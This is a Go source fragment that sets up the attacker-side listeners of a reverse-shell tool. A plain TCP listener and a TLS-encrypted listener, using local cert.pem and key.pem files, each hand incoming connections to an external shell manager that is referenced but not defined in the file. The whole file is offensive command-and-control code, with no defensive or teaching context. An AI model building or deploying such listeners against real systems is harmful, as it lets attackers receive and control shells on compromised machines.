package main

import (
	"fmt"
	"net"
	"crypto/tls"
)

//TCP listener
func StartReverseShellListener(port string) {

	ln, err := net.Listen("tcp", ":"+port)
	if err != nil {
		panic(err)
	}

	fmt.Println("[*] Reverse shell listener on port", port)

	for {

		conn, err := ln.Accept()
		if err != nil {
			continue
		}

		go manager.CreateReverseShell(conn)
	}
}

//TLS listener
func StartTLSReverseShell(port string) {
    cert, err := tls.LoadX509KeyPair("cert.pem", "key.pem")
	if err != nil {
		panic(err)
	}

	config := &tls.Config{
		Certificates: []tls.Certificate{cert},
	}

	ln, err := tls.Listen("tcp", ":"+port, config)
	if err != nil {
		panic(err)
	}

	fmt.Println("[*] TLS reverse shell listener on", port)

	for {

		conn, err := ln.Accept()
		if err != nil {
			continue
		}

		go func(c net.Conn) {

			manager.CreateReverseShell(c)

		}(conn)
	}
}